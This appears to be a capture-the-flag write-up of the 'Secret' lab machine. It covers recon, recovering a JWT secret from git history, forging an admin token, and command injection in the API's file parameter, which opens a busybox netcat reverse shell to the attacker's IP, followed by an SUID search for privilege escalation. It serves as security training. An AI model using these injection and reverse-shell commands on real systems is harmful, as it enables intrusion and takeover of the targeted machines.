# Secret

![secret.png](secret.png)

# Recon

Using nmap to scan the services using a version with a script scan.

`nmap -sC -sV 10.10.11.120 -Pn`

![Untitled](Untitled.png)

## Web

### Directory Discovery

Gobuster to find directories for further exploitation.

`gobuster dir -u http://10.10.11.120:3000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

![Untitled](Untitled%201.png)

### API

API schema can be found at [http://10.10.11.120:3000/docs](http://10.10.11.120:3000/docs)

Register user

`curl '[http://10.10.11.120:3000/api/user/register](http://10.10.11.120:3000/api/user/register)' -X POST -d '{"[name":"test321","email":"test@test.com](mailto:name%22:%22test%22,%22email%22:%22test@test.com)","password":"test321"}' -H "Content-Type: application/json" -x [http://localhost:8080/](http://localhost:8080/)`

![Untitled](Untitled%202.png)

Login with a user we get the JWT token

`curl '[http://10.10.11.120:3000/api/user/login](http://10.10.11.120:3000/api/user/login)' -X POST -d '{"[email":"test1@test.com](mailto:email%22:%22test1@test.com)","password":"test321"}' -H "Content-Type:application/json" -x [http://localhost:8080/](http://localhost:8080/)`

![Untitled](Untitled%203.png)

Using the new header

`curl '[http://10.10.11.120:3000/api/priv](http://10.10.11.120:3000/api/priv)' -X GET -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NWU2ZTg2MWMxMTQ2ODA0NWRiM2QzMjAiLCJuYW1lIjoidGVzdDEyMyIsImVtYWlsIjoidGVzdEB0ZXN0LmNvbSIsImlhdCI6MTcwOTYzMTgwMH0.Wk-d3Nm5XomrlCzUrqP9R3Rohx1RFMJnD6k4AcG5gT8"`

![Untitled](Untitled%204.png)

Fuzz the API using `ffuf`

`ffuf -u [http://10.10.11.120:3000/api/FUZZ](http://10.10.11.120:3000/api/FUZZ) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 93 -t 10`

![Untitled](Untitled%205.png)

### Database

![Untitled](Untitled%206.png)

### Code analysis

Possible RCE with this `exec` function inside the file `/routes/private.js`

![Untitled](Untitled%207.png)

There is a directory called `.git` that can contain private information

![Untitled](Untitled%208.png)

Here we can see the commit so we can access

![Untitled](Untitled%209.png)

Accessing that commit using the ID and we found the secret for the JWT token

`git show 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78`

![Untitled](Untitled%2010.png)

`gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE`

### JWT token

Using the website we can paste there our JWT token and then put there the secret that we found

[https://jwt.io/](https://jwt.io/)

![Untitled](Untitled%2011.png)

Now modify the token as we can see on the docs the `_id`, `name` and `email` put the same values of the administrator user like this, don’t change the `iat` value

![Untitled](Untitled%2012.png)

To verify if we are admin user we can make a request to `/api/priv`

`curl '[http://10.10.11.120:3000/api/priv](http://10.10.11.120:3000/api/priv)' -X GET -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNzA5NTkwNjQ3fQ.3uq7MTeR1JfiKxj0g_cRo3hO7437lQyA1LkmjZriLr4" | jq .`

![Untitled](Untitled%2013.png)

## FootHold

Now that we are admin we can try to exploit the `exec` function found earlier, make a request to `/api/logs?file=` and we get this response

![Untitled](Untitled%2014.png)

By making a `ls` command we can list the contents of the current directory 

![Untitled](Untitled%2015.png)

RCE using `busybox`

Open a `netcat` listener, i used port `5555` you can use other port

`nc -nvlp 5555`

`curl '[http://10.10.11.120:3000/api/logs?file=;busybox nc 10.10.14.51 5555 -e bash](http://10.10.11.120:3000/api/logs?file=;busybox%20nc%2010.10.14.51%205555%20-e%20bash)' -X GET -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNzA5NTkwNjQ3fQ.3uq7MTeR1JfiKxj0g_cRo3hO7437lQyA1LkmjZriLr4"`

![Untitled](Untitled%2016.png)

## Privilege escalation

Upgrade shell

`python3 -c “import pty;pty.spawn(’/bin/bash’)”`

### SUID files

Find SUID files

`find / -type f -perm -4000 2>/dev/null`

![Untitled](Untitled%2017.png)

Run the count 

![Untitled](Untitled%2018.png)

Root flag

![Untitled](Untitled%2019.png)
